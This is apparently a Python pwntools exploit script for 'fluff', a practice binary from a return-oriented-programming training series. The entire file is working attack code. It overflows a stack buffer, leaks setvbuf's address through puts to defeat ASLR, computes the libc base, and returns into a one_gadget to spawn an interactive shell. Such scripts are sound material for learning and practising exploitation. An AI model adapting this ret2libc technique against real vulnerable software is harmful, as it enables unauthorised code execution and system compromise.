#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./fluff")
elf = ELF("./fluff")
libc = elf.libc
p1ret = 0x4008c3

gdb.attach(p)
pay = 'A'*(0x20+0x8)
pay += p64(p1ret) + p64(elf.got['setvbuf']) + p64(elf.plt['puts'])
pay += p64(elf.symbols['pwnme'])

p.sendlineafter("> ", pay)
setvbuf = u64(p.recvuntil("\x7f")[-6:] + "\x00\x00")
libcBase = setvbuf - libc.symbols['setvbuf']
log.info("setvbuf : "+hex(setvbuf))

#gdb.attach(p)

one_gadget = libcBase + 0xf02a4
binsh = libcBase + list(libc.search("/bin/sh"))[0]
system = libcBase + libc.symbols['system']

pay = 'A'*(0x20+0x8)
#pay += p64(p1ret) + p64(binsh) + p64(system) 
pay += p64(one_gadget)

p.sendlineafter("\n> ", pay)

p.interactive()
